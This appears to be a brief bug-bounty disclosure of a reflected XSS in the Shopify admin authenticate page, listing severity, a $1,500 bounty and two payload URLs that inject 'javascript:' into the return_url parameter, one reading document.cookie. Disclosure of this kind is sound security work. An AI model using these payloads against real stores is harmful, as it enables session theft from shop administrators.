## 0x01 Reflected XSS on $Any$.myshopify.com/admin	

Severity	High (7 ~ 8.9)
Bounty	$1,500

## 0x02 

Paylaod: https://<Any>.myshopify.com/admin/authenticate?return_url=javascript:alert(100)//

 https://<Any>.myshopify.com/admin/authenticate/?return_url=https://<Any>.myshopify.com/admin/authenticate/?return_url=javascript:alert(document.cookie)